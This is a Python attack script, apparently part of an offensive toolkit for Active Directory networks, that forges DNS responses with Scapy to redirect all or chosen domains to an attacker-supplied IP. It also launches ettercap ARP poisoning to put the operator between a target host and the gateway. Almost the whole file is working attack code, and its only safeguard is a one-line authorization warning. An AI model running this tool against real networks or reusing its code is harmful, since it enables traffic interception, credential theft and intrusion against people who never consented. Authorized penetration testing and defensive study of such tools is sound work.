#!/usr/bin/env python3
"""
DNS Spoofing Attack for Active Directory
Intercepts and manipulates DNS queries to redirect traffic

WARNING: Active network attack. Use only with explicit authorization.
"""

import sys
import os
import argparse
import subprocess
import time
from datetime import datetime
from scapy.all import *

sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))

from core.database import DatabaseManager
from core.logger import setup_logger, get_logger

logger = None

class DNSSpoofing:
    """DNS spoofing attack using Scapy"""
    
    def __init__(self, interface, session_dir, attacker_ip):
        self.interface = interface
        self.session_dir = session_dir
        self.attacker_ip = attacker_ip
        self.spoofed_queries = []
        self.running = True
    
    def spoof_dns_response(self, packet):
        """Create spoofed DNS response"""
        if packet.haslayer(DNSQR):  # DNS Query
            query_name = packet[DNSQR].qname.decode('utf-8')
            
            # Log query
            logger.info(f"DNS Query: {query_name}")
            
            # Create spoofed response
            spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst)/ \
                         UDP(dport=packet[UDP].sport, sport=53)/ \
                         DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNS].qd,
                             an=DNSRR(rrname=packet[DNSQR].qname, 
                                     ttl=10, rdata=self.attacker_ip))
            
            # Send spoofed response
            send(spoofed_pkt, verbose=0, iface=self.interface)
            
            logger.warning(f"🎯 Spoofed: {query_name} -> {self.attacker_ip}")
            
            self.spoofed_queries.append({
                'timestamp': datetime.now().isoformat(),
                'query': query_name,
                'spoofed_ip': self.attacker_ip
            })
    
    def selective_spoof(self, packet, target_domains):
        """Spoof only specific domains"""
        if packet.haslayer(DNSQR):
            query_name = packet[DNSQR].qname.decode('utf-8').lower()
            
            # Check if query matches target domains
            for domain in target_domains:
                if domain.lower() in query_name:
                    self.spoof_dns_response(packet)
                    break
    
    def run_dns_spoofing(self, duration=300, target_domains=None):
        """
        Execute DNS spoofing attack
        
        Args:
            duration: How long to run (seconds)
            target_domains: List of domains to spoof (None = spoof all)
        """
        logger.info("=" * 60)
        logger.info("DNS Spoofing Attack")
        logger.info("=" * 60)
        logger.info(f"Interface: {self.interface}")
        logger.info(f"Attacker IP: {self.attacker_ip}")
        logger.info(f"Duration: {duration}s")
        
        if target_domains:
            logger.info(f"Target domains: {', '.join(target_domains)}")
            logger.warning("⚠️  Spoofing SPECIFIC domains only")
        else:
            logger.warning("⚠️  Spoofing ALL DNS queries!")
        
        # Set timeout
        start_time = time.time()
        
        def should_stop(pkt):
            return time.time() - start_time > duration
        
        try:
            if target_domains:
                # Selective spoofing
                sniff(filter="udp port 53", prn=lambda p: self.selective_spoof(p, target_domains),
                      stop_filter=should_stop, iface=self.interface)
            else:
                # Spoof everything
                sniff(filter="udp port 53", prn=self.spoof_dns_response,
                      stop_filter=should_stop, iface=self.interface)
            
            logger.info(f"DNS spoofing completed. Spoofed {len(self.spoofed_queries)} queries")
            return True
            
        except KeyboardInterrupt:
            logger.warning("DNS spoofing interrupted by user")
            return False
        
        except Exception as e:
            logger.error(f"DNS spoofing failed: {e}")
            return False
    
    def generate_summary(self):
        """Generate attack summary"""
        if not self.spoofed_queries:
            logger.info("No DNS queries were spoofed")
            return
        
        # Count unique domains
        unique_domains = set()
        for query in self.spoofed_queries:
            unique_domains.add(query['query'])
        
        logger.info("=" * 60)
        logger.info("DNS Spoofing Summary")
        logger.info("=" * 60)
        logger.info(f"Total queries spoofed: {len(self.spoofed_queries)}")
        logger.info(f"Unique domains: {len( unique_domains)}")
        
        # Save to file
        if self.session_dir:
            import json
            summary_file = os.path.join(self.session_dir, 'dns_spoofing_results.json')
            with open(summary_file, 'w') as f:
                json.dump({
                    'total_spoofed': len(self.spoofed_queries),
                    'unique_domains': len(unique_domains),
                    'queries': self.spoofed_queries
                }, f, indent=2)
            logger.info(f"Results saved: {summary_file}")


class LocalNetworkSpoofing:
    """Local network spoofing attacks"""
    
    def __init__(self, interface, session_dir):
        self.interface = interface
        self.session_dir = session_dir
    
    def run_ettercap_mitm(self, target1, target2=None):
        """
        Run Ettercap for ARP-based MITM
        
        Args:
            target1: First target IP
            target2: Second target IP (gateway if not specified)
        """
        # Check for ettercap
        try:
            subprocess.run(['which', 'ettercap'], check=True, capture_output=True)
        except:
            logger.error("ettercap not found. Install with:")
            logger.error("  apt-get install ettercap-text-only")
            return False
        
        logger.info("=" * 60)
        logger.info("Ettercap ARP MITM Attack")
        logger.info("=" * 60)
        
        if not target2:
            # Get default gateway
            result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
            for line in result.stdout.split('\n'):
                if 'default via' in line:
                    target2 = line.split()[2]
                    break
        
        logger.info(f"Target 1: {target1}")
        logger.info(f"Target 2: {target2}")
        
        # Build ettercap command
        cmd = [
            'ettercap',
            '-T',  # Text mode
            '-q',  # Quiet
            '-i', self.interface,
            '-M', 'arp:remote',  # ARP poisoning
            f'/{target1}//',
            f'/{target2}//'
        ]
        
        logger.info(f"Command: {' '.join(cmd)}")
        logger.warning("⚠️  Ettercap MITM attack starting...")
        
        try:
            subprocess.run(cmd, timeout=300)  # 5 minute timeout
            return True
        except subprocess.TimeoutExpired:
            logger.info("Ettercap attack timed out")
            return False
        except Exception as e:
            logger.error(f"Ettercap failed: {e}")
            return False


def main(session_dir, interface, attacker_ip, mode='dns', target_domains=None, 
         duration=300, ettercap_targets=None):
    """Main DNS/network spoofing execution"""
    global logger
    
    setup_logger("dns_spoofing", session_dir)
    logger = get_logger("dns_spoofing")
    
    # Check for root
    if os.geteuid() != 0:
        logger.error("DNS spoofing requires root privileges")
        return
    
    logger.info("=" * 60)
    logger.info("DNS/Network Spoofing Framework")
    logger.info("=" * 60)
    
    if mode == 'dns':
        # DNS spoofing
        spoofing = DNSSpoofing(interface, session_dir, attacker_ip)
        
        # Parse target domains if provided
        domains = None
        if target_domains:
            domains = target_domains.split(',')
        
        success = spoofing.run_dns_spoofing(duration=duration, target_domains=domains)
        
        if success:
            spoofing.generate_summary()
    
    elif mode == 'ettercap':
        # Ettercap MITM
        if not ettercap_targets:
            logger.error("Ettercap mode requires --ettercap-targets")
            return
        
        targets = ettercap_targets.split(',')
        target1 = targets[0]
        target2 = targets[1] if len(targets) > 1 else None
        
        spoofing = LocalNetworkSpoofing(interface, session_dir)
        success = spoofing.run_ettercap_mitm(target1, target2)
    
    else:
        logger.error(f"Unknown mode: {mode}")
        return
    
    if success:
        logger.info("✅ Spoofing attack complete")
    else:
        logger.error("Spoofing attack failed")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="DNS Spoofing & Network MITM Attack"
    )
    parser.add_argument("--session-dir", required=True)
    parser.add_argument("--interface", default="eth0")
    parser.add_argument("--attacker-ip", help="Attacker IP for DNS responses")
    parser.add_argument("--mode", choices=['dns', 'ettercap'], default='dns')
    parser.add_argument("--target-domains", help="Comma-separated domains to spoof")
    parser.add_argument("--duration", type=int, default=300)
    parser.add_argument("--ettercap-targets", help="Comma-separated IPs for Ettercap")
    
    args = parser.parse_args()
    
    if args.mode == 'dns' and not args.attacker_ip:
        print("Error: --attacker-ip required for DNS mode")
        sys.exit(1)
    
    main(args.session_dir, args.interface, args.attacker_ip, args.mode,
         args.target_domains, args.duration, args.ettercap_targets)
